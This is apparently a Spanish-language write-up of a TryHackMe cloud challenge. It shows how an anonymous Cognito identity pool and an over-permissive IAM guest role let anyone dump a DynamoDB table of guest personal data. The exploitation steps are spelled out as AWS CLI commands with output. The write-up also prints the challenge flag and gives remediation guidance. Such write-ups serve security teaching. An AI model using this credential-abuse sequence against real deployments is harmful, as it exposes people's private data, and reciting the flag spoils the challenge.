Byte Lotus Wellness — de "app gratis sin login" a volcado completo de PII vía Cognito + DynamoDB

Categoría: Cloud / AWS IAM Misconfiguration Sistema: AWS (S3 static site + Cognito + DynamoDB) Plataforma: TryHackMe (Advent-style Challenge · Día 3)

Resumen

La "Byte Lotus Wellness App" es un sitio estático alojado en S3 que, para no pedir login, entrega a cualquier visitante credenciales AWS temporales de invitado a través de un Amazon Cognito Identity Pool. Esas credenciales están pensadas solo para leer el perfil propio de cada huésped en DynamoDB (GetItem), pero el rol IAM asociado al acceso "no autenticado" concede permisos mucho más amplios de los necesarios. Como resultado, cualquier persona puede usar esas mismas credenciales "gratuitas" para hacer un Scan completo de la tabla y volcar los datos de todos los huéspedes — nombre, email, teléfono, ubicación GPS y, de forma especialmente grave, contraseñas en texto plano.

Flag: THM{fr33_app_fr33_d4t4!}

El enunciado, desmontado

Vale la pena releer el briefing con lo que ya se sabe después, porque cada frase es una pista técnica disfrazada de narrativa:

Frase del enunciadoLectura técnica
"No account needed. No login screen."No hay autenticación de usuario final → la identidad se resuelve de otra forma (Cognito unauthenticated identity)
"It just… knows things about you the moment you open it."La app hace una lectura de datos (GetItem) inmediatamente al cargar, usando un identificador local (guest_id en localStorage)

Análisis

1. Reconocimiento inicial: la página estática

Objetivo: identificar cómo interactúa el frontend con AWS.

El objetivo es un bucket S3 configurado como sitio web estático:

http://complimentary-wellness-app-332173347248.s3-website-us-east-1.amazonaws.com/

El HTML servido es mínimo: un dashboard vacío ("Loading your dashboard…") que se rellena vía JavaScript. Dos scripts cargan en el <head>/final del <body>:

<script src="https://sdk.amazonaws.com/js/aws-sdk-2.1500.0.min.js"></script>
<script src="app.js"></script>

Señal de alarma inmediata: cargar el AWS SDK for JavaScript directamente en un frontend público indica que la aplicación va a interactuar con servicios AWS directamente desde el navegador, sin backend/API intermedio que valide o filtre las peticiones. Esto normalmente implica credenciales embebidas o, como en este caso, un mecanismo de credenciales "anónimas" vía Cognito.

2. El hallazgo en app.js

Objetivo: extraer la configuración necesaria para el ataque del código cliente.

El archivo app.js confirma la sospecha y expone, en texto plano, toda la configuración necesaria:

const IDENTITY_POOL_ID = "us-east-1:836c0949-292d-485b-b532-52d5ca7bb688";
const AWS_REGION = "us-east-1";
const TABLE_NAME = "complimentary-GuestWellnessProfiles";

AWS.config.region = AWS_REGION;
AWS.config.credentials = new AWS.CognitoIdentityCredentials({
  IdentityPoolId: IDENTITY_POOL_ID,
});

El propio comentario del desarrollador en el código es prácticamente una confesión de la causa raíz:

// No login screen on purpose: every visitor gets "free" AWS guest
// credentials from our Cognito Identity Pool so we can save wellness
// preferences without the friction of an account.

El resto de la lógica es simple: genera un guest_id aleatorio guardado en localStorage (identificador débil, previsible y controlado enteramente por el cliente) y hace un único dynamodb.getItem() sobre la tabla complimentary-GuestWellnessProfiles usando ese id como clave.

3. Fundamento: ¿qué es un Cognito Identity Pool?

Amazon Cognito ofrece dos conceptos distintos que conviene no confundir: los User Pools (gestión de usuarios con login, tal y como se entiende habitualmente "autenticación") y los Identity Pools (federación de identidades para obtener credenciales temporales de AWS — Access Key, Secret Key, Session Token — que permiten a un cliente, autenticado o no, llamar directamente a servicios de AWS como DynamoDB o S3).

Un Identity Pool puede configurarse para permitir acceso no autenticado ("unauthenticated identities" / guest access). Cuando esto ocurre, AWS asigna automáticamente un rol IAM específico para invitados (en este caso, complimentary-cognito-unauth-role, como se confirma con sts get-caller-identity). Cualquier visitante de la web, sin registrarse ni autenticarse de ninguna forma, puede pedir credenciales que asumen ese rol.

Cliente (navegador) → visita la web en S3
       ↓
Cognito Identity Pool → GetId (sin auth)
       ↓
STS (vía Cognito) → GetCredentialsForIdentity
       ↓
Rol asumido: complimentary-cognito-unauth-role
       ↓
DynamoDB → GetItem *y* Scan

El diseño en sí no es la vulnerabilidad: los Cognito Identity Pools con acceso no autenticado son un patrón legítimo y común (analítica anónima, apps sin fricción, etc.). El problema real está un nivel más abajo: qué permisos concede el rol IAM asociado a ese acceso de invitado. Si ese rol se restringe correctamente (por ejemplo, con políticas basadas en condiciones que solo permitan dynamodb:GetItem con una clave igual al cognito-identity.amazonaws.com:sub del propio invitado), la app funciona exactamente igual para el usuario legítimo, pero un Scan como el que se hizo aquí sería denegado con AccessDeniedException.

4. Explotación paso a paso

Objetivo: obtener credenciales de invitado y comprobar hasta dónde llegan sus permisos.

Paso 1 — Solicitar identidad. Con el IdentityPoolId extraído de app.js, se solicita una identidad de invitado sin ningún tipo de credencial previa:

aws cognito-identity get-id \
  --identity-pool-id us-east-1:836c0949-292d-485b-b532-52d5ca7bb688 \
  --region us-east-1

{
    "IdentityId": "us-east-1:4d571309-b041-c7d5-dafb-8c5ec7c00497"
}

Paso 2 — Canjear identidad por credenciales. Con ese IdentityId, se piden las credenciales AWS reales asociadas a él. Esta es la operación que materializa el "acceso gratuito" del enunciado — sin ningún login, se obtienen credenciales completamente funcionales de AWS:

aws cognito-identity get-credentials-for-identity \
  --identity-id us-east-1:4d571309-b041-c7d5-dafb-8c5ec7c00497 \
  --region us-east-1

{
  "IdentityId": "us-east-1:4d571309-b041-c7d5-dafb-8c5ec7c00497",
  "Credentials": {
    "AccessKeyId": "ASIAU2VYTBGYMVIGT7F7",
    "SecretKey": "<redacted>",
    "SessionToken": "<redacted, ~2.6KB JWT-like token>",
    "Expiration": "2026-07-30T02:45:44-04:00"
  }
}

Estas credenciales son temporales (nótese Expiration) y de tipo ASIA... (Access Key de sesión, no de usuario IAM permanente), pero son completamente funcionales mientras no expiren — exactamente igual que si fueran robadas de un usuario real.

Paso 3 — Cargar credenciales en el entorno:

export AWS_ACCESS_KEY_ID="ASIAU2VYTBGYMVIGT7F7"
export AWS_SECRET_ACCESS_KEY="<secret>"
export AWS_SESSION_TOKEN="<session token>"

Paso 4 — Confirmar la identidad asumida:

aws sts get-caller-identity --region us-east-1

{
    "UserId": "AROAU2VYTBGYCEB4JME2S:CognitoIdentityCredentials",
    "Account": "332173347248",
    "Arn": "arn:aws:sts::332173347248:assumed-role/complimentary-cognito-unauth-role/CognitoIdentityCredentials"
}

Esto confirma que, sin ninguna autenticación, se está operando como el rol complimentary-cognito-unauth-role en la cuenta AWS 332173347248 — el mismo rol que usa legítimamente la propia aplicación para cualquier visitante.

Paso 5 — Replicar el comportamiento legítimo (GetItem): esta es la operación que app.js ejecuta de forma legítima: lectura acotada a un único ítem por clave primaria.

aws dynamodb get-item \
  --table-name complimentary-GuestWellnessProfiles \
  --key '{"guest_id": {"S": "guest-noexiste"}}' \
  --region us-east-1

Paso 6 — Explotación, "ask it for more" (Scan): siguiendo literalmente la pista de @0xMia, se prueba una operación de más alcance que la que usa la app: en lugar de pedir un ítem por su clave, se solicita toda la tabla.

aws dynamodb scan \
  --table-name complimentary-GuestWellnessProfiles \
  --region us-east-1

Resultado: la ausencia de un AccessDeniedException aquí es el hallazgo central del reto: el rol de invitado tiene dynamodb:Scan (o un permiso comodín tipo dynamodb:*) sobre la tabla, cuando el caso de uso legítimo de la aplicación solo necesitaba dynamodb:GetItem.

6. Por qué funcionó: la causa raíz en IAM

El fallo no está en Cognito en sí, ni en DynamoDB, ni siquiera en exponer un Identity Pool ID en el frontend (eso es esperable e inevitable: cualquier cliente JS que use Cognito necesariamente expone su Pool ID, igual que expone su URL de API). El fallo está en la política IAM adjunta al rol de invitado, que probablemente concede una acción amplia sobre la tabla en lugar de restringirla a la operación mínima necesaria:

✗ Política vulnerable (probable)
{
  "Effect": "Allow",
  "Action": "dynamodb:*",
  "Resource": "arn:aws:dynamodb:us-east-1:*:table/complimentary-GuestWellnessProfiles"
}
✓ Política correctamente acotada
{
  "Effect": "Allow",
  "Action": "dynamodb:GetItem",
  "Resource": "arn:...:table/complimentary-GuestWellnessProfiles",
  "Condition": {
    "ForAllValues:StringEquals": {
      "dynamodb:LeadingKeys": [
        "${cognito-identity.amazonaws.com:sub}"
      ]
    }
  }
}

La versión acotada usa DynamoDB Fine-Grained Access Control: además de limitar la acción a GetItem (sin Scan, Query sin condición, ni operaciones de escritura), ata la clave accedida al propio identificador de la identidad de Cognito que hace la llamada — de modo que, incluso conociendo el nombre de la tabla, un invitado solo puede leer su propio registro, nunca el de otro.

7. Hallazgos adicionales de interés

  • Contraseñas en texto plano en DynamoDB. Independientemente del problema de control de acceso, almacenar contraseñas sin hash (ni siquiera con un hash débil) es una mala práctica grave por sí sola — cualquier acceso legítimo a la tabla (administradores, backups, otros servicios internos) expone credenciales reutilizables.
  • Identificador de sesión débil y controlado por el cliente. El guest_id se genera con Math.random() en el navegador y se guarda en localStorage, sin ninguna vinculación criptográfica con la identidad de Cognito. Aunque en este caso el Scan hace irrelevante este problema, en una versión "parcheada" que solo permitiera GetItem sin condición por sub, seguiría siendo trivial adivinar o enumerar guest_id de otros usuarios.
  • Datos de geolocalización precisa (location, coordenadas GPS) almacenados y expuestos junto al resto del perfil, agravando el impacto de privacidad del hallazgo.

Remediación

  • Aplicar el principio de mínimo privilegio al rol de invitado de Cognito: sustituir cualquier permiso amplio (dynamodb:*, Scan, Query sin condición) por únicamente GetItem/PutItem sobre la clave propia.
  • Usar Fine-Grained Access Control de DynamoDB con dynamodb:LeadingKeys atado a cognito-identity.amazonaws.com:sub.
  • Nunca almacenar contraseñas en texto plano; usar un algoritmo de hash con salt diseñado para contraseñas (bcrypt, scrypt, Argon2).
  • Revisar periódicamente los roles IAM de "unauthenticated identities" con herramientas como IAM Access Analyzer, que puede señalar automáticamente permisos excesivos en roles públicamente asumibles.
  • Minimizar datos expuestos al cliente: si la app solo necesita mostrar nombre y notas, el modelo de permisos y el propio esquema de la tabla no deberían permitir arrastrar teléfono, contraseña o ubicación en la misma operación de lectura.

Lecciones aprendidas

Este reto ilustra un patrón de vulnerabilidad cada vez más común en aplicaciones "serverless"/JAMstack: cuando el frontend habla directamente con servicios cloud (sin una API intermedia que pueda aplicar lógica de autorización adicional), toda la seguridad recae en la política IAM del rol asumido. Un Identity Pool con acceso no autenticado no es, en sí, un error — pero conceder a ese rol más de lo estrictamente necesario convierte cualquier visitante anónimo en un lector potencial de toda la base de datos, sin necesidad de explotar ningún fallo de código: basta con conocer el SDK que se está usando y pedir una operación distinta a la que la interfaz gráfica ofrece.
